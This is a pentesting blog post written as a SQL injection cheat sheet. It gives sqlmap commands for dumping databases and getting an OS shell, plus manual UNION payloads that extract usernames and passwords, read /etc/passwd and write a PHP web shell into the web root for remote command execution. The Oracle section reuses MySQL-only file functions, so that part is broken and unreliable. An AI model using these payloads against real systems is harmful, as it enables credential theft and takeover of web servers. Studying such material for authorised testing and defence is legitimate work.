---
layout: single
title: '<span class="Articles"> SQLINJECTIONS - /Articles</span>'
excerpt: "SQLinjections  are important if you want to try your lucky in Bugbounty or pentesting Web Labs, I highly recommend you to always try them in pages that you are searching for vulnerabilities "
date: 2023-04-26
header:

  teaser_home_page: true



categories:

  - article
  - machine
tags:  
  - wordpress
  - Oraclein
  - SQLin
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - windows
  - linux
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---


SQLinjections  are important if you want to try your lucky in Bugbounty or pentesting Web Labs, I highly recommend you to always try them in pages that you are searching for vulnerabilities 

**We will see all this from the perspective and methodology of a penetration test.**




SQLMAP automatic tool to explote SQL injections 


# Search for databases
sqlmap –u http://<targetip>/index.php?par= –dbs

# dump tables from database 
sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –tables –-dump
sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –T tablename –-dump

# OS Shell
sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell

--------------------------------

Manual sql injection commands

# check for sqli vulnerability
 
?id=1'

# find the number of columns
?id=1 order by 9-- -

# Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8,9-- -
or 
?id=1 union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

# Get username of the sql-user
?id=1 union select 1,2,3,4,user(),6,7,8,9-- -

# Get version
?id=1 union select 1,2,3,4,version(),6,7,8,9-- -

# Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables-- -

# Get all columns from a specific table
?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'-- -

# Get content from the users-table. From columns name and password. (The 0x3a only servers to create a delimiter between name and password)
?id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users

# read file
?id=1 union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9-- -
?id=1 union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9-- -

# create a file and call it to check if really created
?id=1 union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test'-- -
?id=1 union select 1,2,3,4, load_file('/var/www/test') ,6,7,8,9-- -
	
# create a file to get a shell
?id=1 union select null,null,null,null,'<?php system($_GET[‘cmd’]) ?>' ,6,7,8,9 into outfile '/var/www/shell.php'-- -
?id=1 union select null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -

# then go to browser and see if you can execute commands
http://<targetip>/shell.php?cmd=id

Reverse [shells](https://pentestmonkey.net/cheat-sheet)
 
# Oracle
  
Manual Oracle injection commands

# check for Oracle injection vulnerability
 
?id=1'

# find the number of columns
?id=1 order by 9 from dual-- -

# Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8,9 from dual-- -
or 
?id=1 union select NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from dual-- -


# Get version
?id=1 union select 1,2,3,4,banner,6,7,8,9 from v$version-- -

# Get all DBS for oracle
?id=1 union select 1,2,3,4,owner,6,7,8,9 from all_tables-- -

# Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from all_tables where owner ='dbs'-- -

# Get all columns from a specific columns
?id=1 union select 1,2,3,4,column_name,6,7,8,9 from all_tab_columns where table_name ='tables'-- -

# Get content from the users-table. From columns name and password. (The 0x3a only servers to create a delimiter between name and password)
?id=1 union select 1,2,3,4,password||':'||username,6,7,8,9 from users-- -

# read file
?id=1 union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 from dual-- -
?id=1 union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 from dual-- -

# create a file and call it to check if really created
?id=1 union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' from dual-- -
?id=1 union select 1,2,3,4, load_file('/var/www/test') ,6,7,8,9-- -
	
# create a file to get a shell
?id=1 union select null,null,null,null,'<?php system($_GET[‘cmd’]) ?>' ,6,7,8,9 into outfile '/var/www/shell.php'from dual-- -
?id=1 union select null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -

# then go to browser and see if you can execute commands
http://<targetip>/shell.php?cmd=id
  

  
  
